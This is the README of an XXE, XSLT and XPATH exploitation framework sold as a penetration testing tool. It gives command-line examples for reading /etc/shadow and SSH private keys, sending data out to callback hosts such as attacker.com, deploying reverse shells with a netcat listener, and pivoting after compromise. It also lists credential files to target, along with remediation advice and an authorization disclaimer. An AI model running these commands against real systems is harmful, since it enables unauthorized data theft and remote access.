# GhostXXE - Advanced XML Exploitation Framework v2.0
### 👻 Ghost Ops Security - Professional Penetration Testing Tool

## Overview

**GhostXXE** is a comprehensive XML External Entity (XXE) exploitation framework designed for professional penetration testing and red team engagements. This tool provides automated discovery, exploitation, and post-exploitation capabilities for XXE, XSLT, and XPATH injection vulnerabilities.

## Features

### 🎯 Discovery & Detection
- **Basic XXE Detection** - Classic file read exploitation
- **Error-Based XXE** - Blind XXE via error messages
- **Local DTD Exploitation** - Linux & Windows DTD poisoning
- **XInclude Attacks** - XML inclusion-based exploitation
- **XSLT Injection** - PHP, .NET, and Java XSLT RCE
- **XPATH Injection** - Automated XPATH injection testing

### 🔓 Exploitation Modes
- **Out-of-Band (OOB)** - HTTP/FTP-based data exfiltration
- **Interactive Shell** - Command execution via expect wrapper
- **Reverse Shell** - Automated PHP reverse shell deployment
- **File Read** - Extract sensitive files from target
- **SSRF** - Server-Side Request Forgery via XXE

### 🛠️ Advanced Capabilities
- Multi-threaded OOB server
- Automatic payload encoding (Base64, UTF-7, etc.)
- Custom header & cookie support
- Proxy integration (Burp Suite compatible)
- Comprehensive payload library
- JSON output for reporting

## Installation

```bash
# Clone or download the tool
git clone <repository-url>
cd xxe-exploitation-framework

# Install dependencies
pip3 install -r requirements.txt

# Make executable
chmod +x ghostxxxe.py
```

### Dependencies
```
requests
urllib3
colorama
```

## Usage

### Basic Scan
```bash
# Scan target for all XXE vulnerabilities
python3 ghostxxxe.py -u http://target.com/api/xml -m POST

# Verbose mode with custom headers
python3 ghostxxxe.py -u http://target.com/api/xml -m POST -v \
  -H "Authorization: Bearer YOUR_TOKEN"
```

### File Reading
```bash
# Read specific file
python3 ghostxxxe.py -u http://target.com/api/xml -m POST -f /etc/shadow

# Windows file read
python3 ghostxxxe.py -u http://target.com/api/xml -m POST -f "C:\Windows\win.ini"
```

### Out-of-Band Exploitation
```bash
# OOB with external callback server
python3 ghostxxxe.py -u http://target.com/api/xml -m POST \
  --oob --callback http://YOUR_SERVER:8080 -f /etc/passwd

# OOB with built-in server
python3 ghostxxxe.py -u http://target.com/api/xml -m POST \
  --oob --callback-ip YOUR_IP --callback-port 8080 -f /etc/passwd
```

### Interactive Shell
```bash
# Get interactive command execution
python3 ghostxxxe.py -u http://target.com/api/xml -m POST --interactive

# Example session:
xxe-shell> whoami
xxe-shell> cat /etc/passwd
xxe-shell> id
xxe-shell> exit
```

### Reverse Shell Deployment
```bash
# Step 1: Start netcat listener on your attack box
nc -lvnp 4444

# Step 2: Deploy reverse shell
python3 ghostxxxe.py -u http://target.com/api/xml -m POST \
  --reverse-shell --attacker-ip YOUR_IP --attacker-port 4444
```

### Proxy Integration
```bash
# Route through Burp Suite for manual analysis
python3 ghostxxxe.py -u http://target.com/api/xml -m POST \
  --proxy http://127.0.0.1:8080 -v

# Save results for reporting
python3 ghostxxxe.py -u http://target.com/api/xml -m POST \
  -o results.json
```

### Advanced Examples
```bash
# Full engagement scan with all options
python3 ghostxxxe.py -u https://target.com/api/process \
  -m POST \
  -H "Content-Type: application/xml,X-API-Key: secret" \
  -c "session=abc123;token=xyz789" \
  --proxy http://127.0.0.1:8080 \
  -t 30 \
  -v \
  -o engagement_results.json

# Test SOAP endpoint
python3 ghostxxxe.py -u http://target.com/soap/service \
  -m POST \
  -H "SOAPAction: ProcessXML" \
  -f /etc/passwd

# Test SVG upload endpoint
python3 ghostxxxe.py -u http://target.com/upload/svg \
  -m POST \
  --oob --callback http://attacker.com:8080
```

## Payload Types Implemented

### XXE Payloads
1. **Basic XXE** - Standard entity injection
2. **Parameter Entity** - Advanced entity manipulation
3. **PHP Wrapper** - Base64 encoding wrapper
4. **UTF-7 Encoding** - Alternative encoding bypass
5. **Error-Based** - Blind exploitation via errors
6. **Local DTD Linux** - fontconfig DTD poisoning
7. **Local DTD Windows** - cim20.dtd exploitation
8. **XInclude** - XML inclusion attacks
9. **SVG XXE** - SVG vector graphics exploitation
10. **SOAP XXE** - SOAP envelope injection

### XSLT Payloads
1. **PHP RCE** - readfile, system, shell_exec
2. **.NET RCE** - C# script blocks with Process
3. **Java RCE** - Java runtime execution
4. **File Read** - document() function exploitation
5. **SSRF** - Server-side request forgery

### XPATH Payloads
- Boolean-based injection
- Union-based extraction
- Error-based exploitation
- Authentication bypass

## Attack Workflow

### Phase 1: Discovery
```
1. Identify XML input points
2. Test basic entity injection
3. Detect XML parser behavior
4. Identify available features (entities, DTDs, etc.)
```

### Phase 2: Exploitation
```
1. Confirm vulnerability with file read
2. Escalate to OOB if needed
3. Extract sensitive files:
   - /etc/passwd
   - /etc/shadow
   - ~/.ssh/id_rsa
   - /var/www/html/config.php
   - C:\Windows\win.ini
   - C:\inetpub\wwwroot\web.config
```

### Phase 3: Post-Exploitation
```
1. Deploy interactive shell
2. Maintain access via reverse shell
3. Pivot to internal network
4. Document findings for report
```

## Common Target Files

### Linux
```
/etc/passwd              # User accounts
/etc/shadow              # Password hashes (requires root)
/etc/hostname            # System hostname
/root/.ssh/id_rsa        # Root SSH private key
/home/user/.ssh/id_rsa   # User SSH private key
/var/www/html/config.php # Web application config
/proc/self/environ       # Environment variables
/var/log/apache2/access.log  # Web logs
```

### Windows
```
C:\Windows\win.ini       # Windows configuration
C:\boot.ini              # Boot configuration
C:\Windows\System32\drivers\etc\hosts  # Hosts file
C:\inetpub\wwwroot\web.config  # IIS configuration
C:\Users\Administrator\.ssh\id_rsa  # SSH key
```

## Technical Details

### OOB Server
The tool includes a built-in HTTP server for Out-of-Band exploitation:
- Listens on configurable port (default: 8080)
- Serves malicious DTD files
- Captures exfiltrated data
- Multi-threaded for handling multiple callbacks

### Payload Encoding
Automatic encoding support:
- Base64 for binary data
- UTF-7 for WAF bypass
- URL encoding for special characters
- HTML entity encoding

### Detection Methods
The tool uses multiple detection techniques:
1. **Content-based** - Looks for file contents in response
2. **Length-based** - Analyzes response length differences
3. **Error-based** - Monitors XML parsing errors
4. **Time-based** - Detects delays from external calls
5. **OOB-based** - Confirms via callback

## Burp Suite Integration

### Setup
1. Configure Burp to listen on 127.0.0.1:8080
2. Run tool with `--proxy http://127.0.0.1:8080`
3. All requests flow through Burp for analysis
4. Modify and replay requests in Repeater

### Workflow
```bash
# Scan through Burp
python3 ghostxxxe.py -u http://target.com/api -m POST \
  --proxy http://127.0.0.1:8080 -v

# Analyze in Burp:
# 1. View all payloads in HTTP History
# 2. Send interesting requests to Repeater
# 3. Modify payloads for custom exploitation
# 4. Use Intruder for parameter fuzzing
```

## Remediation Guidance

### For Developers
1. **Disable External Entities**
   ```python
   # Python
   parser = etree.XMLParser(resolve_entities=False)
   
   # Java
   factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   
   # PHP
   libxml_disable_entity_loader(true);
   ```

2. **Use Safe Parsers**
   - defusedxml (Python)
   - OWASP JSON Schema Validator
   - Input validation libraries

3. **Whitelist Validation**
   - Validate XML structure
   - Restrict allowed elements
   - Sanitize user input

### For Defenders
1. **WAF Rules** - Block DOCTYPE declarations
2. **Network Segmentation** - Restrict outbound connections
3. **File Access Controls** - Limit parser file access
4. **Monitoring** - Alert on unusual XML patterns

## Reporting

### Generate Report
```bash
# Scan and save JSON
python3 ghostxxxe.py -u http://target.com/api -m POST -o results.json

# Results include:
# - Vulnerability type
# - Successful payloads
# - Extracted data
# - Timestamps
```

### Report Format
```json
[
  {
    "type": "Basic XXE - File Read",
    "payload": "<?xml version=\"1.0\"?>...",
    "file": "/etc/passwd",
    "timestamp": "2025-10-14T10:30:00",
    "response_preview": "root:x:0:0:root:/root:/bin/bash..."
  }
]
```

## Legal & Ethical Use

⚠️ **IMPORTANT**: This tool is for authorized penetration testing only.

### Authorized Use
- ✅ Internal security assessments
- ✅ Client-authorized penetration tests
- ✅ Bug bounty programs (within scope)
- ✅ Educational environments
- ✅ Research with permission

### Unauthorized Use
- ❌ Testing without written authorization
- ❌ Attacking systems you don't own
- ❌ Accessing others' data
- ❌ Disrupting services

### Best Practices
1. **Get Written Authorization** - Always obtain signed permission
2. **Define Scope** - Know what's in/out of scope
3. **Document Everything** - Keep detailed logs
4. **Communicate** - Report findings responsibly
5. **Avoid Damage** - Don't disrupt business operations

## Troubleshooting

### Common Issues

**No vulnerabilities detected**
```bash
# Try verbose mode to see responses
python3 ghostxxxe.py -u http://target.com/api -m POST -v

# Check if XML is accepted
curl -X POST http://target.com/api -H "Content-Type: application/xml" -d '<root>test</root>'

# Verify proxy isn't blocking
python3 ghostxxxe.py -u http://target.com/api -m POST --proxy http://127.0.0.1:8080
```

**OOB callback not received**
```bash
# Verify callback server is accessible
curl http://YOUR_CALLBACK_SERVER:8080

# Check firewall rules
sudo iptables -L

# Use alternative port
python3 ghostxxxe.py ... --callback-port 80
```

**SSL/TLS errors**
```bash
# Tool automatically disables SSL verification
# If issues persist, check proxy SSL settings
```

## Contributing

Ghost Ops Security welcomes improvements:
- New payload types
- Additional evasion techniques
- Parser-specific exploits
- Enhanced reporting

## References

### Learning Resources
- [OWASP XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

### Related Tools
- XXEinjector
- oxml_xxe
- dtd-finder
- 230-OOB

## Support

For Ghost Ops Security clients:
- Technical support available
- Custom payload development
- Training and guidance
- Report consultation

---

**👻 Ghost Ops Security - GhostXXE** - Professional Penetration Testing
*Where hackers fear to tread, we operate.*
